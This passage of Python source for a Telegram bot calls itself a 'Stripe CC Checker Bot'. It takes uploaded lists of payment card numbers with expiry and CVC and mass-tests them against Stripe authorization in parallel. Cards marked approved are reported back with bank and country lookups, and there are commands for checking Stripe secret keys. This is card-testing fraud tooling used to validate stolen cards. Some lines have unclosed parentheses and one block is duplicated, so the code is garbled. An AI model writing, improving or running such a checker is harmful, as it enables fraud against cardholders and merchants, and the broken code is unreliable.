                is_success = any(keyword.lower() in str(result).lower() for keyword in success_keywords)
                
                return {
                    'status': 'success' if is_success else 'failed',
                    'message': result,
                    'card': card
                }
                
            except Exception as e:
                return {'status': 'error', 'message': str(e), 'card': card}

        async def update_status():
            while ACTIVE_CHECKS.get(user_id, False) and USER_SESSIONS[user_id]['checked'] < total_cards:
                await asyncio.sleep(1)  # Update every second
                
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg.message_id,
                    text=(
                        f"Antico Cleaner\n"
                        f"Total Filtered Cards: {total_cards}\n\n"
                        f"Please Wait Checking Your Cards 🟢\n\n"
                        f"Gate -> Stripe Auth 🟢\n\n"
                        f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                        f"CC • Last checked\n\n"
                        f"Status • Processing\n\n"
                        f"APPROVED !✔ • {USER_SESSIONS[user_id]['approved']}\n"
                        f"DECLINED !✔ • {USER_SESSIONS[user_id]['declined']}\n"
                        f"{USER_SESSIONS[user_id]['checked']} / {total_cards} •\n\n"
                        f"Stop Check 🟢"
                    ),
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
                    ])
                )

        # Start status updates
        asyncio.create_task(update_status())

        # Process cards in parallel
        tasks = []
        for card in cards:
            if not ACTIVE_CHECKS.get(user_id, True):
                break
                
            task = asyncio.create_task(process_card(card))
            tasks.append(task)
            
        for task in asyncio.as_completed(tasks):
            result = await task
            
            if not ACTIVE_CHECKS.get(user_id, True):
                break
                
            if result and result.get('status') == 'success':
                USER_SESSIONS[user_id]['approved'] += 1
                # Send approved card to user
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
                )
            else:
                USER_SESSIONS[user_id]['declined'] += 1
            
            USER_SESSIONS[user_id]['checked'] += 1

        # Final update
        if ACTIVE_CHECKS.get(user_id, False):
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=status_msg.message_id,
                text=(
                    f"✅ Mass check completed!\n"
                    f"Approved: {USER_SESSIONS[user_id]['approved']}\n"
                    f"Declined: {USER_SESSIONS[user_id]['declined']}\n"
                    f"Total: {total_cards}"
                )
            )
            ACTIVE_CHECKS[user_id] = False

    @staticmethod
    async def mstt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if not update.message.reply_to_message or not update.message.reply_to_message.document:
            await update.message.reply_text("Please reply to a file containing cards")
            return

        # Mark this user as active
        ACTIVE_CHECKS[user_id] = True
        
        # Initialize user session
        USER_SESSIONS[user_id] = {
            'approved': 0,
            'declined': 0,
            'checked': 0,
            'total': 0
        }

        # Download the file
        file = await update.message.reply_to_message.document.get_file()
        content = (await file.download_as_bytearray()).decode('utf-8')
        cards = [line.strip() for line in content.split('\n') if '|' in line.strip()]
        total_cards = len(cards)
        USER_SESSIONS[user_id]['total'] = total_cards

        # Create initial status message
        status_msg = await update.message.reply_text(
            f"Antico Cleaner\n"
            f"Total Filtered Cards: {total_cards}\n\n"
            f"Please Wait Checking Your Cards 🟢\n\n"
            f"Gate -> Stripe Auth 🟢\n\n"
            f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
            f"CC • \n\n"
            f"Status • \n\n"
            f"APPROVED !✔ • 0\n"
            f"DECLINED !✔ • 0\n"
            f"0 / {total_cards} •\n\n"
            f"Stop Check 🟢",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
            ])
        )

        # Process cards asynchronously
        async def process_card(card):
            if not ACTIVE_CHECKS.get(user_id, True):
                return None
                
            try:
                cc_number, exp_month, exp_year, cvc = card.split('|')
                result = await CardChecker.visit_website(cc_number, exp_month, exp_year, cvc)
                
                # Check for success keywords
                success_keywords = [
                    "succeeded", "success", "Thank you", "approved", "complete", 
                    "completed", "pass", "Thanks", "successful", "Saved payment method"
                ]
                
                is_success = any(keyword.lower() in str(result.get('message', '')).lower() for keyword in success_keywords)
                
                return {
                    'status': 'success' if is_success else 'failed',
                    'message': result.get('message', 'Unknown response'),
                    'card': card
                }
                
            except Exception as e:
                return {'status': 'error', 'message': str(e), 'card': card}

        async def update_status():
            while ACTIVE_CHECKS.get(user_id, False) and USER_SESSIONS[user_id]['checked'] < total_cards:
                await asyncio.sleep(1)  # Update every second
                
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg.message_id,
                    text=(
                        f"Antico Cleaner\n"
                        f"Total Filtered Cards: {total_cards}\n\n"
                        f"Please Wait Checking Your Cards 🟢\n\n"
                        f"Gate -> Stripe Auth 🟢\n\n"
                        f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                        f"CC • Last checked\n\n"
                        f"Status • Processing\n\n"
                        f"APPROVED !✔ • {USER_SESSIONS[user_id]['approved']}\n"
                        f"DECLINED !✔ • {USER_SESSIONS[user_id]['declined']}\n"
                        f"{USER_SESSIONS[user_id]['checked']} / {total_cards} •\n\n"
                        f"Stop Check 🟢"
                    ),
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
                    ])
                )

        # Start status updates
        asyncio.create_task(update_status())

        # Process cards in parallel
        tasks = []
        for card in cards:
            if not ACTIVE_CHECKS.get(user_id, True):
                break
                
            task = asyncio.create_task(process_card(card))
            tasks.append(task)
            
        for task in asyncio.as_completed(tasks):
            result = await task
            
            if not ACTIVE_CHECKS.get(user_id, True):
                break
                
            if result and result.get('status') == 'success':
                USER_SESSIONS[user_id]['approved'] += 1
                # Send approved card to user
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
                )
            else:
                USER_SESSIONS[user_id]['declined'] += 1
            
            USER_SESSIONS[user_id]['checked'] += 1

        # Final update
        if ACTIVE_CHECKS.get(user_id, False):
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=status_msg.message_id,
                text=(
                    f"✅ Mass check completed!\n"
                    f"Approved: {USER_SESSIONS[user_id]['approved']}\n"
                    f"Declined: {USER_SESSIONS[user_id]['declined']}\n"
                    f"Total: {total_cards}"
                )
            )
            ACTIVE_CHECKS[user_id] = False

    @staticmethod
    async def stt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            if len(context.args) < 1:
                await update.message.reply_text("Please provide CC info in format: /stt 5104040271954646|02|26|607")
                return

            cc_info = context.args[0]
            parts = cc_info.split('|')
            if len(parts) != 4:
                await update.message.reply_text("Invalid format. Use: /stt 5104040271954646|02|26|607")
                return

            cc_number, exp_month, exp_year, cvc = parts

            # Send processing message
            processing_msg = await update.message.reply_text("🔄 Processing your card, please wait...")

            # Run validation in executor
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                CHECK_EXECUTOR,
                lambda: asyncio.run(CardChecker.visit_website(cc_number, exp_month, exp_year, cvc))
            
            bin_info = await CardChecker.check_bin(cc_number[:6])

            # Format response
            status_emoji = "✅" if result['status'] == 'success' or (isinstance(result['message'], str) and 'success' in result['message'].lower() else "❌"

            response = f"""📌 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 🔥
━━━━━━━━━━━━━━━

💳 𝗖𝗮𝗿𝗱 ➜ {cc_number}|{exp_month}|{exp_year}|{cvc}
🚪 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe auth
📡 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {status_emoji}
⚡️ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result['message']}

━━━━━━━━━━━━━━━
𝗕𝗶𝗻 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
━━━━━━━━━━━━━━━

🔍 𝗕𝗶𝗻 ➜ {cc_number[:6]}
🏷️ 𝗕𝗿𝗮𝗻𝗱 ➜ {bin_info.get('brand', 'N/A')}
🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {bin_info.get('country_code', 'N/A')}
🇨🇴 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 𝗡𝗮𝗺𝗲 ➜ {bin_info.get('country_name', 'N/A')}
🏦 𝗕𝗮𝗻𝗸 ➜ {bin_info.get('bank', 'N/A')}
📶 𝗟𝗲𝘃𝗲𝗹 ➜ {bin_info.get('level', 'N/A')}
📌 𝗧𝘆𝗽𝗲 ➜ {bin_info.get('type', 'N/A')}

━━━━━━━━━━━━━━━
𝗥𝗲𝗾 ⌁ @{update.effective_user.username or 'N/A'}
𝗗𝗲𝘃𝗕𝘆 ⌁ @MUMIRU
━━━━━━━━━━━━━━━"""

            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=response
            )

        except Exception as e:
            await update.message.reply_text(f"Error processing your request: {str(e)}")

    @staticmethod
    async def stop_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        query = update.callback_query
        await query.answer()
        
        user_id = int(query.data.split('_')[-1])
        if user_id in ACTIVE_CHECKS:
            ACTIVE_CHECKS[user_id] = False
            await query.edit_message_text("🛑 Mass check stopped by user.")

def run_bot():
    # Initialize bot with increased timeout
    application = Application.builder().token(BOT_TOKEN).read_timeout(30).write_timeout(30).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", Commands.start))
    application.add_handler(CommandHandler("register", Commands.register_command))
    application.add_handler(CommandHandler("cmds", Commands.cmds))
    application.add_handler(CommandHandler("user", Commands.generate_random_user))
    application.add_handler(CommandHandler("st", Commands.st_command))
    application.add_handler(CommandHandler("mst", Commands.mst_command))
    application.add_handler(CommandHandler("mstt", Commands.mstt_command))
    application.add_handler(CommandHandler("sk", Commands.check_sk))
    application.add_handler(CommandHandler("svv", Commands.svv_command))
    application.add_handler(CommandHandler("stt", Commands.stt_command))
    application.add_handler(CommandHandler("stop", Commands.stop_command))
    application.add_handler(CallbackQueryHandler(Commands.button_callback))
    application.add_handler(CallbackQueryHandler(Commands.stop_check_callback, pattern=r"^stop_check_\d+$"))

    # Add message handler for SK input
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^sk_') & ~filters.COMMAND, Commands.handle_sk_message))

    # Start bot with increased concurrency
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        pool_timeout=30,
        read_timeout=30,
        write_timeout=30,
        close_loop=False
    )

@app.route('/')
def home():
    return "Stripe CC Checker Bot is running!"

if __name__ == "__main__":
    # Start Flask in a separate thread
    import threading
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000))
    flask_thread.daemon = True
    flask_thread.start()

    # Start Telegram bot
    run_bot()
